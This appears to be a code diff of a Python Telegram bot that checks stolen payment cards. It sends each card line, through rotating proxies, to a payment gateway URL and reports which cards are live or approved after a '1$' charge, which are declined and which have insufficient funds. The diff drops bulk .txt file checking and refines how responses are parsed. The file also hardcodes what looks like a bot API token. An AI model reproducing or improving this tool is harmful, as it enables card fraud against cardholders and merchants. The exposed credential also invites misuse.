@@ -1,6 +1,5 @@
 from telebot import TeleBot
 import requests
-import time
 
 bot = TeleBot("8663863938:AAG1yVZYZLrbRcSIWLBiN7MJFqnmV3i2CqE")
 
@@ -25,67 +24,33 @@ def get_proxy():
 
 @bot.message_handler(commands=['start'])
 def start(m):
-    bot.send_message(m.chat.id, "✅ **Full Proxy + File Checker ON**")
-
-@bot.message_handler(commands=['chk'])
-def chk_file(m):
-    bot.send_message(m.chat.id, "📁 Cards wali .txt file bhej")
-
-@bot.message_handler(content_types=['document'])
-def handle_txt(m):
-    if not m.document.file_name.endswith('.txt'):
-        bot.reply_to(m, "Sirf .txt file bhej")
-        return
-
-    file_info = bot.get_file(m.document.file_id)
-    downloaded = bot.download_file(file_info.file_path)
-    cards = [line.strip() for line in downloaded.decode('utf-8').splitlines() if line.strip()]
-
-    bot.send_message(m.chat.id, f"🔄 {len(cards)} cards check shuru...\nProxy rotation ON")
-
-    live = 0
-    dead = 0
-    msg = bot.send_message(m.chat.id, "Processing...")
-
-    for i, card in enumerate(cards):
-        proxy = get_proxy()
-        bot.edit_message_text(f"🔄 Checking {i+1}/{len(cards)}\n🌐 Proxy: {proxy['http']}\nCurrent: {card[:12]}****", m.chat.id, msg.message_id)
-
-        try:
-            url = GATEWAY + card.replace(" ", "")
-            r = requests.get(url, proxies=proxy, timeout=20)
-            resp = r.text.lower()
-
-            if any(x in resp for x in ["approved", "success", "charged", "live"]):
-                live += 1
-                bot.send_message(m.chat.id, f"✅ **LIVE**\n{card}")
-            elif any(x in resp for x in ["insufficient", "funds"]):
-                bot.send_message(m.chat.id, f"⚠️ **INSUFFICIENT FUNDS**\n{card}")
-            else:
-                dead += 1
-
-        except:
-            dead += 1
-            time.sleep(1)
-
-    bot.edit_message_text(f"✅ **COMPLETE**\n✅ Live: {live}\n❌ Dead: {dead}\nTotal: {len(cards)}", m.chat.id, msg.message_id)
+    bot.send_message(m.chat.id, "✅ **Updated Logic ON**")
 
 @bot.message_handler(func=lambda m: True)
-def single_check(m):
+def checker(m):
     for line in m.text.splitlines():
         line = line.strip()
         if not line: continue
-        # same check logic as above (with proxy)
+
         proxy = get_proxy()
         try:
             url = GATEWAY + line.replace(" ", "")
             r = requests.get(url, proxies=proxy, timeout=20)
-            resp = r.text.lower()
-            if any(x in resp for x in ["approved", "success", "charged", "live"]):
-                bot.reply_to(m, f"✅ **LIVE**\n{line}")
-            elif any(x in resp for x in ["insufficient", "funds"]):
-                bot.reply_to(m, f"⚠️ **INSUFFICIENT**\n{line}")
-        except:
-            pass
+            resp = r.text
+
+            if "ORDER NOT APPROVED" in resp or '"status":"DECLINED"' in resp or "DECLINED" in resp:
+                bot.reply_to(m, f"❌ **Card was got declined**\n{line}")
+
+            elif any(x in resp for x in ["ORDER APPROVED", "charged", "charge", "success", "APPROVED"]):
+                bot.reply_to(m, f"✅ **1$ Charged - Card Approved**\n{line}")
+
+            elif "insufficient" in resp.lower() or "funds" in resp.lower():
+                bot.reply_to(m, f"⚠️ **Insufficient Funds**\n{line}")
+
+            else:
+                bot.reply_to(m, f"❓ **Unknown Response**\n{line}\n{resp[:200]}")
+
+        except Exception as e:
+            bot.reply_to(m, f"❌ Error on {line}")
 
 bot.infinity_polling()
